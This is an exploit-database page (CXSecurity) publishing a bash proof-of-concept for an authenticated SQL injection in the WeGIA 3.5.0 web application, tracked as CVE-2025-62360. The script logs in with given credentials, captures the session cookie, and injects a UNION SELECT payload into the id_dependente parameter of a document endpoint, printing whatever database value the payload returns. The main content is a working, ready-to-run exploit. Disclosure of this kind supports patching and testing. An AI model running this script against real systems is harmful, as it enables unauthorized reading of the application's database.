---
title: WeGIA 3.5.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2026030007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-03
fetch_date: 2026-03-04T04:02:39.348213
---

# WeGIA 3.5.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WeGIA 3.5.0 SQL Injection** **2026.03.03**  Credit:  **[Onur Demir](https://cxsecurity.com/author/Onur%2BDemir/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-62360](https://cxsecurity.com/cveshow/CVE-2025-62360/ "Click to see CVE-2025-62360")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: WeGIA 3.5.0 - SQL Injection
# Date: 2025-10-14
# Exploit Author: Onur Demir (OnurDemir-Dev)
# Vendor Homepage: https://www.wegia.org
# Software Link: https://github.com/LabRedesCefetRJ/WeGIA/
# Version: <=3.5.0
# Tested on: Local Linux (localhost/127.0.0.1)
# CVE : CVE-2025-62360
# Advisory / Reference: https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-mwvv-q9gh-gwxm
# Notes: Run this script ONLY on a local/test instance you own or are authorized to test.
# ============================================================
if [ -z "$4" ]; then
# Usage prompt if required arguments are missing
echo "Usage: $0 <target-url> <user> <password> <payload>"
echo "Example: $0 http://127.0.0.1/WeGIA/ \"admin\" \"wegia\" \"version()\""
exit 1
fi
url="$1"
user="$2"
pass="$3"
payload="$4"
# Check if URL format is valid (basic regex)
# This is a basic sanity check for the URL string format.
if ! [[ "$url" =~ ^http?://[a-zA-Z0-9.\_-]+ ]]; then
echo "⚠️ Invalid URL format: $url"
exit 1
fi
# Perform login request (multipart/form)
# -s silent, -w "%{http\_code}" will append HTTP code to response
# -D - prints response headers to stdout, combined with body in login\_response
login\_response=$(curl -s -w "%{http\_code}" "$url/html/login.php" \
-D - \
-X POST \
-F "cpf=${user}"\
-F "pwd=${pass}")
# Extract last 3 chars as HTTP status code from the combined response
login\_status\_code="${login\_response: -3}"
# If login did not return a 302 redirect, handle error cases
if [ "$login\_status\_code" -ne 302 ]; then
# If curl couldn't connect, curl may return 0 or empty status code
if [ "$login\_status\_code" -eq 0 ] || [ -z "$login\_status\_code" ]; then
echo "❌ Unable to reach URL: $url"
exit 1
fi
# Otherwise report unexpected login status
echo "Error: Received HTTP status code from login: $login\_status\_code"
exit 1
fi
# Extract the Location header from the login response headers
# Using awk to find the first Location header (case-insensitive)
login\_location=$(echo "$login\_response" | awk -F': ' 'BEGIN{IGNORECASE=1} /^Location:/{print substr($0, index($0,$2)); exit}' | tr -d '\r')
# Check username and password correctness using Location header content
# If the Location does not include home.php, consider login failed.
if [[ "$login\_location" != \*"home.php"\* ]]; then
# If Location contains "erro" assume wrong credentials; otherwise unknown error
if [[ "$login\_location" == \*"erro"\* ]]; then
echo "Error: Wrong username or password!"
else
echo "Error: Unknown Error!"
fi
exit 1
fi
# Extract Set-Cookie header (first cookie) and keep only "name=value"
# tr -d '\r' removes possible CR characters
set\_cookie=$(echo "$login\_response" | awk -F': ' 'BEGIN{IGNORECASE=1} /^Set-Cookie:/{print substr($0, index($0,$2)); exit}' | tr -d '\r')
set\_cookie=$(echo "$set\_cookie" | cut -d';' -f1)
#Exploit Vulnarbility
# (The following performs the SQL injection request using the cookie obtained above)
# The payload variable is used verbatim in the id\_dependente parameter.
# Ensure payload is provided safely in the script invocation and that you are authorized to test.
# Execute the curl command and capture the output and status code
response=$(curl -s -w "%{http\_code}" "$url/html/funcionario/dependente\_documento.php" -d "id\_dependente=1 UNION+SELECT 'a','b',$payload;#" -b "$set\_cookie;" -H "Content-Type: application/x-www-form-urlencoded")
# Extract the HTTP status code (last 3 characters)
status\_code="${response: -3}"
# Extract the body (everything except the last 3 characters)
body="${response:0:-3}"
# If the exploit request returned HTTP 200, try to extract id\_doc
if [ "$status\_code" -eq 200 ]; then
# Prefer a robust JSON extractor if available; this line uses grep -Po to capture the id\_doc value including quotes.
# Note: This grep returns the quoted string (e.g. "11.8.3-MariaDB-1+b1 from Debian").
clear\_response=$(echo "$body" | grep -Po '"id\_doc": \*\K"[^"]\*"')
# Print the extracted value (or empty if not found)
echo "$clear\_response"
else
# Non-200 status handling
echo "Error: Received HTTP status code $status\_code"
fi

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top